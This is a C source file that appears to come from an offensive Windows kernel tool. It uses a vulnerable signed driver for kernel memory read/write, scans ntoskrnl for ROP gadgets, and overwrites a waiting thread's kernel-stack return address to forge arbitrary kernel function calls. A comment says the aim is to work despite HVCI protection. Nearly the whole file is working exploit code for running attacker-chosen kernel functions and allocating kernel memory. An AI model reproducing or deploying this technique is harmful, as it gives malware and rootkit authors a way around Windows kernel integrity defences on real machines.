#include "stdafx.h"

// StackBase and KernelStack field offset
#define KTHREAD_StackBase    0x38
#define KTHREAD_KernelStack  0x58

// magic exit code for DummyThread()
#define THREAD_EXIT_CODE 0x1337

static BOOL m_bInitialized = FALSE;

// kernel image name and memory location
static DWORD m_dwKernelSize = 0;
static DWORD_PTR m_KernelAddr = NULL;

// userland copy of the kernel image
static PVOID m_KernelImage = NULL;
static DWORD m_dwKernelImageSize = NULL;

// mandatory function
static PVOID m_ZwTerminateThread = NULL;

// ROP gadgets used to forge function calls
static PVOID m_RopAddr_1 = NULL, m_RopAddr_2 = NULL;
static PVOID m_RopAddr_3 = NULL, m_RopAddr_4 = NULL, m_RopAddr_5 = NULL;
//--------------------------------------------------------------------------------------
static BOOL MatchSign(PUCHAR Data, PUCHAR Sign, int Size)
{
    for (int i = 0; i < Size; i += 1)
    {
        if (Sign[i] == 0xff)
        {
            // 0xff means to match any value
            continue;
        }

        if (Sign[i] != Data[i])
        {
            // not matched
            return FALSE;
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
static BOOL KfGetKernelImageInfo(PVOID *pImageAddress, PDWORD pdwImageSize, char *lpszName)
{
    // query loaded kernel modules information
    PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)GetSystemInformation(SystemModuleInformation);
    if (Info)
    {
        // return kernel image load address and size
        *pImageAddress = Info->Modules[0].ImageBase;
        *pdwImageSize = Info->Modules[0].ImageSize;

        // get kernel file name from NT path
        strcpy(lpszName, (char *)Info->Modules[0].FullPathName + Info->Modules[0].OffsetToFileName);

        M_FREE(Info);

        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOL KfGetSyscallNumber(char *lpszProcName, PDWORD pdwRet)
{
    // get ntdll image address
    HMODULE hImage = GetModuleHandle("ntdll.dll");
    if (hImage == NULL)
    {
        return FALSE;
    }

    // get syscall stub address
    PUCHAR Addr = (PUCHAR)GetProcAddress(hImage, lpszProcName);
    if (Addr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find %s()\n", lpszProcName);
        return FALSE;
    }

    // check for mov eax, imm32 instruction
    if (*(Addr + 3) == 0xb8)
    {
        // return instruction argument, syscall number
        *pdwRet = *(PDWORD)(Addr + 4);
        return TRUE;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unexpected code for %s()\n", lpszProcName);
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
PVOID KfGetKernelProcAddress(char *lpszProcName)
{
    if (m_KernelImage == NULL || m_KernelAddr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // get RVA of the target function
    DWORD Offset = LdrGetProcAddress(m_KernelImage, lpszProcName);
    if (Offset != 0)
    {
        // return an actual address of the target function
        return RVATOVA(m_KernelAddr, Offset);
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
PVOID KfGetKernelZwProcAddress(char *lpszProcName)
{
    PVOID Addr = NULL;
    DWORD dwSyscallNumber = 0;

    if (m_KernelImage == NULL || m_KernelAddr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // get target function syscall number
    if (!KfGetSyscallNumber(lpszProcName, &dwSyscallNumber))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: KfGetSyscallNumber() fails\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(m_KernelImage, ((PIMAGE_DOS_HEADER)m_KernelImage)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        // check for the code sectin
        if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
            (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0)
        {
            for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; n += 1)
            {                            
                DWORD Ptr = pSection->VirtualAddress + n;

                /*
                    Signature of Zw stub to call system calls from kernel drivers.
                */
                UCHAR Sign[] = "\x48\x8B\xC4"                  // mov     rax, rsp
                               "\xFA"                          // cli
                               "\x48\x83\xEC\x10"              // sub     rsp, 10h
                               "\x50"                          // push    rax
                               "\x9C"                          // pushfq
                               "\x6A\x10"                      // push    10h
                               "\x48\x8D\x05\xFF\xFF\xFF\xFF"  // lea     rax, KiServiceLinkage
                               "\x50"                          // push    rax
                               "\xB8\x00\x00\x00\x00"          // mov     eax, XXXXXXXX
                               "\xE9\xFF\xFF\xFF\xFF";         // jmp     KiServiceInternal

                *(PDWORD)(Sign + 0x15) = dwSyscallNumber;

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign, sizeof(Sign)-1))
                {
                    // calculate an actual kernel address
                    Addr = RVATOVA(m_KernelAddr, Ptr);
                }
            }
        }

        pSection += 1;
    }

    return Addr;
}
//--------------------------------------------------------------------------------------
BOOL KfInit(void)
{
    char szKernelName[MAX_PATH], szKernelPath[MAX_PATH];

    if (m_bInitialized)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Already initialized\n");
        return TRUE;
    }

    GET_NATIVE(RtlGetVersion);

    if (f_RtlGetVersion == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to obtain needed functions\n");
        return FALSE;
    }

    RTL_OSVERSIONINFOW VersionInfo;
    VersionInfo.dwOSVersionInfoSize = sizeof(VersionInfo);

    if (NT_ERROR(f_RtlGetVersion(&VersionInfo)))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: RtlGetVersion() fails\n");
        return FALSE;
    }

    // check for the proper NT version
    if (!(VersionInfo.dwMajorVersion == 10 && VersionInfo.dwBuildNumber >= 1709))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Unsupported NT version\n");
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Well, maybe it's actually supported but it has "
                                                   "no HVCI so there's no sense to use this project\n");
        return FALSE;
    }

    DbgMsg(
        __FILE__, __LINE__, "NT version: %d.%d.%d\n", 
        VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber
    );

    // load loldriver
    if (!DriverInit())
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverInit() fails\n");
        goto _end;
    }    

    // get kernel address
    if (!KfGetKernelImageInfo((PVOID *)&m_KernelAddr, &m_dwKernelSize, szKernelName))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: GetKernelImageInfo() fails\n");
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, "Kernel is at "IFMT", image size is 0x%x\n", m_KernelAddr, m_dwKernelSize);      

    GetSystemDirectory(szKernelPath, MAX_PATH);
    strcat(szKernelPath, "\\");
    strcat(szKernelPath, szKernelName);

    PVOID Data = NULL;
    DWORD dwDataSize = 0;

    if (ReadFromFile(szKernelPath, &Data, &dwDataSize))
    {
        // load kernel image into the userland
        if (LdrMapImage(Data, dwDataSize, &m_KernelImage, &m_dwKernelImageSize))
        {
            // relocate kernel image to its actual address
            LdrProcessRelocs(m_KernelImage, (PVOID)m_KernelAddr);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrMapImage() fails\n");
        }

        M_FREE(Data);
    }    
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: ReadFromFile() fails\n");
        goto _end;
    }

    if (m_KernelImage == NULL)
    {
        goto _end;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(m_KernelImage, ((PIMAGE_DOS_HEADER)m_KernelImage)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        // check for the code sectin
        if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
            (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0)
        {
            for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; n += 1)
            {
                DWORD Ptr = pSection->VirtualAddress + n;

                /*
                    Signature of nt!_guard_retpoline_exit_indirect_rax() used as
                    ROP gadget to control function argument registers
                */
                UCHAR Sign_1[] = "\x48\x8b\x44\x24\x20"          // mov     rax, [rsp+0x20]
                                 "\x48\x8b\x4c\x24\x28"          // mov     rcx, [rsp+0x28]
                                 "\x48\x8b\x54\x24\x30"          // mov     rdx, [rsp+0x30]
                                 "\x4c\x8b\x44\x24\x38"          // mov     r8, [rsp+0x38]
                                 "\x4c\x8b\x4c\x24\x40"          // mov     r9, [rsp+0x40] 
                                 "\x48\x83\xC4\x48"              // add     rsp, 48h
                                 "\x48\xFF\xE0";                 // jmp     rax

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign_1, sizeof(Sign_1)-1))
                {
                    // calculate an actual kernel address
                    m_RopAddr_1 = RVATOVA(m_KernelAddr, Ptr);
                }

                /*
                    ROP gadget used to reserve an extra space for the stack arguments
                */
                UCHAR Sign_2[] = "\x48\x83\xC4\x68"              // add     rsp, 68h
                                 "\xC3";                         // retn

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign_2, sizeof(Sign_2)-1))
                {
                    // calculate an actual kernel address                        
                    m_RopAddr_2 = RVATOVA(m_KernelAddr, Ptr);
                }
                    
                /*
                    RCX control ROP gadget to use in pair with the next one
                */
                UCHAR Sign_3[] = "\x59"                          // pop     rcx
                                 "\xC3";                         // retn

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign_3, sizeof(Sign_3)-1))
                {
                    // calculate an actual kernel address
                    m_RopAddr_3 = RVATOVA(m_KernelAddr, Ptr);
                }

                /*
                    ROP gadget used to save forged functoin call return value
                */
                UCHAR Sign_4[] = "\x48\x89\x01"                  // mov     [rcx], rax
                                 "\xC3";                         // retn

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign_4, sizeof(Sign_4)-1))
                {
                    // calculate an actual kernel address
                    m_RopAddr_4 = RVATOVA(m_KernelAddr, Ptr);

                    // dummy dagdet for stack alignment
                    m_RopAddr_5 = RVATOVA(m_KernelAddr, Ptr + 3);
                }
            }
        }

        pSection += 1;
    }

    if (m_RopAddr_1 == NULL || m_RopAddr_2 == NULL ||
        m_RopAddr_3 == NULL || m_RopAddr_4 == NULL || m_RopAddr_5 == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find needed ROP gadgets\n");
        goto _end;
    }    

    DbgMsg(__FILE__, __LINE__, "ROP gadget #1 is at "IFMT"\n", m_RopAddr_1);
    DbgMsg(__FILE__, __LINE__, "ROP gadget #2 is at "IFMT"\n", m_RopAddr_2);
    DbgMsg(__FILE__, __LINE__, "ROP gadget #3 is at "IFMT"\n", m_RopAddr_3);
    DbgMsg(__FILE__, __LINE__, "ROP gadget #4 is at "IFMT"\n", m_RopAddr_4);
    DbgMsg(__FILE__, __LINE__, "ROP gadget #5 is at "IFMT"\n", m_RopAddr_5);

    /*
        Get address of nt!ZwTerminateThread(), we need this function
        to gracefully shutdown our dummy thread with fucked up kernel stack
    */
    if ((m_ZwTerminateThread = KfGetKernelZwProcAddress("ZwTerminateThread")) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find nt!ZwTerminateThread() address\n");
        goto _end;
    }    

    DbgMsg(__FILE__, __LINE__, "nt!ZwTerminateThread() is at "IFMT"\n", m_ZwTerminateThread);

    m_bInitialized = TRUE;

_end:

    if (!m_bInitialized)
    {
        if (m_KernelImage)
        {
            M_FREE(m_KernelImage);

            m_KernelImage = NULL;
            m_dwKernelImageSize = 0;
        }

        // unload loldriver in case of error
        DriverUninit();        
    }

    return m_bInitialized;
}
//--------------------------------------------------------------------------------------
BOOL KfUninit(void)
{    
    if (m_KernelImage)
    {
        M_FREE(m_KernelImage);

        m_KernelImage = NULL;
        m_dwKernelImageSize = 0;
    }

    m_bInitialized = FALSE;

    // unload loldriver
    return DriverUninit();
}
//--------------------------------------------------------------------------------------
static DWORD WINAPI DummyThread(LPVOID lpParam)
{
    HANDLE hEvent = lpParam;

#ifdef DBG_CALL

    DbgMsg(
        __FILE__, __LINE__,
        "Putting thread %x:%x into the waitable state...\n", GetCurrentProcessId(), GetCurrentThreadId()
    );

#endif

    WaitForSingleObject(hEvent, INFINITE);

#ifdef DBG_CALL

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): EXIT\n");

#endif

    return 0;
}

BOOL KfCallAddr(PVOID ProcAddr, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal)
{
    BOOL bRet = FALSE;    
    HANDLE hThread = NULL, hEvent = NULL;       
    PVOID RetVal = NULL;

    if (!m_bInitialized)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    if (dwArgsCount > MAX_ARGS)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Too many arguments\n");
        return FALSE;
    }       

    // create waitable event
    if ((hEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "CreateEvent() ERROR %d\n", GetLastError());
        goto _end;
    }

    DWORD dwThreadId = 0;

    // create dummy thread
    if ((hThread = CreateThread(NULL, 0, DummyThread, hEvent, 0, &dwThreadId)) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "CreateThread() ERROR %d\n", GetLastError());
        goto _end;
    }

    while (true)
    {
        // determine current state of dummy thread
        DWORD State = GetThreadState(GetCurrentProcessId(), dwThreadId);
        if (State == -1)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: GetThreadState() fails\n");
            goto _end;
        }

        if (State == Waiting)
        {
            // thread was entered into the wait state
            break;
        }

        SwitchToThread();
    }

    // get _KTHREAD address by handle
    PVOID pThread = GetObjectAddress(hThread);
    if (pThread == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: GetObjectAddress() fails\n");
        goto _end;
    }

#ifdef DBG_CALL

    DbgMsg(__FILE__, __LINE__, "_KTHREAD is at "IFMT"\n", pThread);

#endif

    PUCHAR StackBase = NULL, KernelStack = NULL;
    
    // get stack base of the thread
    if (!DriverMemReadPtr(RVATOVA(pThread, KTHREAD_StackBase), (PVOID *)&StackBase))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
        goto _end;
    }

    // get stack pointer of the thread
    if (!DriverMemReadPtr(RVATOVA(pThread, KTHREAD_KernelStack), (PVOID *)&KernelStack))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
        goto _end;
    }

#ifdef DBG_CALL

    DbgMsg(__FILE__, __LINE__, "Thread kernel stack base is at "IFMT"\n", StackBase);
    DbgMsg(__FILE__, __LINE__, "Thread kernel stack pointer is at "IFMT"\n", KernelStack);

#endif

    PVOID RetAddr = NULL;
    PUCHAR Ptr = StackBase - sizeof(PVOID);    

    // walk over the kernel stack
    while (Ptr > KernelStack)
    {
        DWORD_PTR Val = 0;

        // read stack value
        if (!DriverMemReadPtr(Ptr, (PVOID *)&Val))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
            goto _end;
        }

        /* 
            Check for the return address from system call handler back to
            the nt!KiSystemServiceCopyEnd(), it's located at the bottom
            of the kernel stack.
        */
        if (Val > m_KernelAddr &&
            Val < m_KernelAddr + m_dwKernelSize)
        {
            RetAddr = Ptr;
            break;
        }

        // go to the next stack location
        Ptr -= sizeof(PVOID);
    }

    if (RetAddr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to locate return address\n");
        goto _end;
    }

#ifdef DBG_CALL

    DbgMsg(__FILE__, __LINE__, "Return address was found at "IFMT"\n", RetAddr);

#endif

    #define STACK_PUT(_offset_, _val_)                                                          \
                                                                                                \
        if (!DriverMemWritePtr(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_)))                   \
        {                                                                                       \
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemWritePtr() fails\n");    \
            goto _end;                                                                          \
        }

    // hijack the return address with forged function call
    STACK_PUT(0x00, m_RopAddr_1);

    // save an address for the forged function call
    STACK_PUT(0x08 + 0x20, ProcAddr);

    if (dwArgsCount > 0)
    {
        // 1-st argument goes in RCX
        STACK_PUT(0x08 + 0x28, Args[0]);
    }

    if (dwArgsCount > 1)
    {
        // 2-nd argument goes in RDX
        STACK_PUT(0x08 + 0x30, Args[1]);
    }
    
    if (dwArgsCount > 2)
    {
        // 3-rd argument goes in R8
        STACK_PUT(0x08 + 0x38, Args[2]);
    }

    if (dwArgsCount > 3)
    {
        // 4-th argument goes in R9
        STACK_PUT(0x08 + 0x40, Args[3]);
    }

    // reserve shadow space and 9 stack arguments
    STACK_PUT(0x50, m_RopAddr_2);

    for (DWORD i = 4; i < dwArgsCount; i += 1)
    {
        // the rest arguments goes over the stack right after the shadow space
        STACK_PUT(0x58 + 0x20 + ((i - 4) * sizeof(PVOID)), Args[i]);
    }    

    // obtain RetVal address
    STACK_PUT(0xc0, m_RopAddr_3);
    STACK_PUT(0xc8, &RetVal);

    // save return value of the forged function call
    STACK_PUT(0xd0, m_RopAddr_4);

    // dummy gadget for stack alignment
    STACK_PUT(0xd8, m_RopAddr_5);

    // put the next function call
    STACK_PUT(0xe0, m_RopAddr_1);

    // forge nt!ZwTerminateThread() function call
    STACK_PUT(0xe8 + 0x20, m_ZwTerminateThread);
    STACK_PUT(0xe8 + 0x28, hThread);
    STACK_PUT(0xe8 + 0x30, THREAD_EXIT_CODE);

    SwitchToThread();

_end:

    if (hEvent && hThread)
    {
        DWORD dwExitCode = 0;

        // put thread into the ready state
        SetEvent(hEvent);
        WaitForSingleObject(hThread, INFINITE);
        
        GetExitCodeThread(hThread, &dwExitCode);

        // check for the magic exit code set by forged call
        if (dwExitCode == THREAD_EXIT_CODE)
        {
            if (pRetVal)
            {
                // return value of the function
                *pRetVal = RetVal;
            }

            bRet = TRUE;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Something went wrong\n");
        }
    }

    if (hEvent)
    {
        CloseHandle(hEvent);
    }

    if (hThread)
    {
        CloseHandle(hThread);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL KfCall(char *lpszProcName, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal)
{
    PVOID FuncAddr = NULL;

    // obtain target exported function address by its name
    if ((FuncAddr = KfGetKernelProcAddress(lpszProcName)) == NULL)
    {
        if (!strncmp(lpszProcName, "Zw", 2))
        {
            // try to obtain not exported Zw function address
            FuncAddr = KfGetKernelZwProcAddress(lpszProcName);
        }
    }

    if (FuncAddr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find %s() address\n", lpszProcName);
        return FALSE;
    }

    DbgMsg(__FILE__, __LINE__, "nt!%s() is at "IFMT"\n", lpszProcName, FuncAddr);

    // perform the call
    return KfCallAddr(FuncAddr, Args, dwArgsCount, pRetVal);
}
//--------------------------------------------------------------------------------------
PVOID KfMemCopy(PVOID Dst, PVOID Src, SIZE_T Size)
{
    PVOID Ret = NULL;
    PVOID Args[] = { KF_ARG(Dst), KF_ARG(Src), KF_ARG(Size) };

    // perform memory copy operation
    if (KfCall("memcpy", Args, 3, &Ret))
    {
        return Ret;
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
PVOID KfHeapAllocData(SIZE_T Size, PVOID Data)
{
    PVOID Ret = NULL;
    PVOID Args[] = { KF_ARG(NonPagedPool), KF_ARG(Size) };

    // allocate non paged kernel pool memory
    if (KfCall("ExAllocatePool", Args, 2, &Ret))
    {
        if (Data)
        {
            // copy the data into the allocated memory
            return KfMemCopy(Ret, Data, Size);
        }

        return Ret;
    }

    return NULL;
}

PVOID KfHeapAlloc(SIZE_T Size)
{
    return KfHeapAllocData(Size, NULL);
}
//--------------------------------------------------------------------------------------
void KfHeapFree(PVOID Addr)
{
    PVOID Args[] = { KF_ARG(Addr) };

    // free kernel pool memory
    KfCall("ExFreePool", Args, 1, NULL);
}
//--------------------------------------------------------------------------------------
// EoF
